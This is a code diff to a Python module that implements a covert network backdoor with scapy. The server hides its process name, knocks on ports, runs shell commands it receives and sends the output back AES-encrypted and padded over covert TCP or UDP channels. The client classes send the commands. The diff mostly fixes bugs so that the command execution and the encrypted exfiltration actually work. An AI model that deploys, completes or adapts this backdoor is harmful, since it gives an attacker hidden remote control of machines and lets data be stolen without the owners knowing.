@@ -1,11 +1,12 @@
 from __future__ import print_function
-from Queue import Queue
 from scapy.all import *
 from setproctitle import setproctitle, getproctitle
-from Threading import Thread
+from threading import Thread
 
 import command
 import Crypto.Cipher
+import Queue
+import random
 import struct
 import sys
 import time
@@ -67,13 +68,14 @@ class BackdoorServer(object):
         """Listens for a client and stores its IP address (as a string) in self.client on receiving a connection."""
         raise NotImplementedError
 
-    def port_knock(self, knocked_ports):
+    def port_knock(self):
+        knocked_ports = [10000, 20000, 30000] # Until we add this as a config value, if ever
         """Knock on ports decided by user"""
         for port in knocked_ports:
             send(IP(dst=self.client)/TCP(dport=port),verbose=0)
         
 
-    def recv_command(self, queue):
+    def recv_command(self):
         """Receives and deserialises the next command from the connected client.
         
         Returns the received command as a Command object.
@@ -115,11 +117,12 @@ class BackdoorServer(object):
 
     def result_queue(self, queue):
         while True:
-            result = queue.pop()
+            result = queue.get()
             self.send_result(result)
+            queue.task_done()
 
 
-    def send_result(self, queue, result):
+    def send_result(self, result):
         """Sends the results of a command execution to the client.
 
         Positional arguments:
@@ -136,11 +139,11 @@ class BackdoorServer(object):
         for i in range(0, retry_count):
             self.port_knock()
             time.sleep(knock_wait_time)
-            result = covert_sock.connect_ex((self.client, self.dport))
-            if result == 0:
+            connect_result = covert_sock.connect_ex((self.client, self.dport))
+            if connect_result == 0:
                 break
 
-        if result != 0:
+        if connect_result != 0:
             print("Client connection retries exceeded. Failed to send result.")
             return
 
@@ -154,7 +157,7 @@ class BackdoorServer(object):
         iv = make_iv()
         encryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
 
-        start_padding = random.random(2147483647, 4294967295)
+        start_padding = random.randrange(2147483647, 4294967295)
 
         result_bytes = result.to_bytes()
         result_len = len(result_bytes)
@@ -162,7 +165,7 @@ class BackdoorServer(object):
         payload = struct.pack("<I", start_padding)
         payload += struct.pack("<I", result_len)
         payload += self.password
-        payload += result_bytes[:min(len(result_bytes), FIRST_PACKET_PAYLOAD_MAX]
+        payload += result_bytes[:min(len(result_bytes), FIRST_PACKET_PAYLOAD_MAX)]
         if result_len < FIRST_PACKET_PAYLOAD_MAX:
             with open('/dev/random', 'r') as randfile:
                 remainder = FIRST_PACKET_PAYLOAD_MAX - result_len
@@ -187,17 +190,19 @@ class BackdoorServer(object):
                 # - remaining bytes: result bytes + random bytes if remaining result len is < 1016 bytes
                 result_chunk_size = min(result_len, OTHER_PACKET_PAYLOAD_MAX)
                 payload = self.password
-                payload += result_bytes[offset:result_chunk_size]
+                payload += result_bytes[offset:offset+result_chunk_size]
 
                 if result_chunk_size < OTHER_PACKET_PAYLOAD_MAX:
                     with open('/dev/random', 'r') as randfile:
                         remainder = OTHER_PACKET_PAYLOAD_MAX - result_chunk_size
                         payload += randfile.read(remainder)
 
+                payload = encryptor.encrypt(payload)
+
                 try:
                     covert_sock.sendall(payload)
                 except Exception, e:
-                    print("Exception while transmitting result: {}".format(str(e))
+                    print("Exception while transmitting result: {}".format(str(e)))
                     covert_sock.shutdown(socket.SHUT_RDWR)
                     return
 
@@ -210,7 +215,7 @@ class BackdoorServer(object):
         """Runs in a loop listening for clients and serving their requests."""
         self.mask_process()
 
-        queue = Queue(maxsize=0)        
+        queue = Queue.Queue(maxsize=0)
 
         while True:
             print("Waiting for client...")
@@ -218,10 +223,10 @@ class BackdoorServer(object):
             # TODO: Why is this a loop?
             while not self.client:
                 self.listen()
-
             
-            result_send = Thread(target=self.result_queue, args(queue,))
+            result_send = Thread(target=self.result_queue, args=(queue,))
             result_send.setDaemon(True)
+            result_send.start()
             
             print("Client connected: {}".format(self.client))
             while True:
@@ -231,17 +236,19 @@ class BackdoorServer(object):
                         print("{} disconnected.".format(self.client))
                         self.client = None
                         break
-                    file_watch = Thread(target=cmd.run, args(queue,))
-                    file_watch.setDaemon(True)
-                    #result = cmd.run()
 
-                    print("")
                     print(str(cmd))
-                    #print(str(result))
-                    print("")
 
-                    result_send.start()
-                    file_watch.start()
+                    if cmd.type == command.Command.SHELL:
+                        cmd.run(queue)
+                    elif cmd.type == command.Command.WATCH:
+                        # TODO: Create a thread to handle the watch results if there's not already one
+                        # if there is already one, print a warning and do nothing
+                        # 
+                        # file_watch = Thread(target=cmd.run, args=(queue,))
+                        # file_watch.setDaemon(True)
+                        # file_watch.start()
+                        pass
 
                 except KeyboardInterrupt:
                     print("see ya")
@@ -302,7 +309,7 @@ class TcpBackdoorServer(BackdoorServer):
             packet = IP(dst=self.client)\
                      / TCP(dport=self.dport, sport=self.sport, window=32768, flags=PSH|ACK)\
                      / Raw(load=payload)
-            send(packet)
+            send(packet, verbose=0)
         except Exception, err:
             traceback.print_exc()
             sys.exit(1)
@@ -404,12 +411,12 @@ class BackdoorClient(object):
         """
         listen_timeout = 10
         listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listen_sock.setsockopt(socket.SO_REUSEADDR, 1)
+        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listen_sock.settimeout(listen_timeout)
         listen_sock.bind(('', self.lport))
         listen_sock.listen(1)
         try:
-            covert_sock = listen_sock.accept()
+            covert_sock, addr = listen_sock.accept()
         except Exception, e:
             print("Error while listening for server connection: {}".format(str(e)))
             return
@@ -431,10 +438,9 @@ class BackdoorClient(object):
 
         iv = first_packet[0:16]
         decryptor = Crypto.Cipher.AES.new(self.aeskey, Crypto.Cipher.AES.MODE_CBC, iv)
-        offset = 16
 
-        payload = decryptor.decrypt(first_packet[offset:])
-        offset += 4 # Skip the padding bytes
+        payload = decryptor.decrypt(first_packet[16:])
+        offset = 4 # Skip the padding bytes
 
         result_len = struct.unpack("<I", payload[offset:offset+4])[0]
         offset += 4
@@ -465,12 +471,12 @@ class BackdoorClient(object):
                     print("Error while receiving result: {}".format(str(e)))
                     return
 
-                payload = decryptor.decrypt(payload)
+                payload = decryptor.decrypt(packet)
                 if payload[0:8] != self.password:
                     print("Received bad result from server.")
                     return
 
-                result_bytes += payload[8:result_chunk_size]
+                result_bytes += payload[8:8+result_chunk_size]
                 result_len -= result_chunk_size
 
         result_type = ord(result_bytes[0])
@@ -485,35 +491,7 @@ class BackdoorClient(object):
 
 
     def run(self):
-        """Runs in a loop listening for the server and serving their requests."""
-        self.mask_process()
-
-        queue = Queue(maxsize=0)        
-
-        while True:
-            print("Waiting for Server...") #DELETE AFTER
-            
-            # TODO: Why is this a loop?
-            while not self.server:
-                self.listen()
-            result_recv = Thread(target=self.recv_result, args(queue,result))
-            command_send = Thread(target=self.send_command, args(queue,))
-            result_recv.setDaemon(True)
-            command_send.setDaemon(True)
-            
-            print("Server connected: {}".format(self.client))
-            while True:
-                try:
-                    result_recv.start()
-                    command_send.start()
-                    
-                except KeyboardInterrupt:
-                    print("see ya")
-                    sys.exit(0)
-
-                except Exception, err:
-                    traceback.print_exc()
-                    break
+        pass
 
 class TcpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
@@ -531,7 +509,7 @@ class TcpBackdoorClient(BackdoorClient):
 
         try:
             connpacket = IP(dst=self.server) / TCP(dport=self.dport, sport=self.sport, window=windowsize, seq=isn, flags=SYN, options=[("MSS", mss)])
-            send(connpacket)
+            send(connpacket, verbose=0)
         except Exception, err:
             traceback.print_exc()
             sys.exit(1)
@@ -543,16 +521,10 @@ class TcpBackdoorClient(BackdoorClient):
                      / Raw(load=payload)
 
             self.seq += len(payload)
-            send(packet)
+            send(packet, verbose=0)
         except Exception, err:
             traceback.print_exc()
             sys.exit(1)
-
-    def recv(self):
-        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
-        pkts = sniff(filter=bpf_filter, count=1)
-
-        return bytes(pkts[0]["TCP"].payload.load)
 
 class UdpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
@@ -569,7 +541,7 @@ class UdpBackdoorClient(BackdoorClient):
 
         try:
             connpacket = IP(dst=self.server) / UDP(dport=self.dport, sport=self.sport) / Raw(load=masked_pw)
-            send(connpacket)
+            send(connpacket, verbose=0)
         except Exception, err:
             traceback.print_exc()
             sys.exit(1)
@@ -580,13 +552,7 @@ class UdpBackdoorClient(BackdoorClient):
                      / UDP(dport=self.dport, sport=self.sport)\
                      / Raw(load=payload)
 
-            send(packet)
+            send(packet, verbose=0)
         except Exception, err:
             traceback.print_exc()
             sys.exit(1)
-
-    def recv(self):
-        bpf_filter = "src host {} and tcp dst port {}".format(self.server, self.lport)
-        pkts = sniff(filter=bpf_filter, count=1)
-
-        return bytes(pkts[0]["TCP"].payload.load)
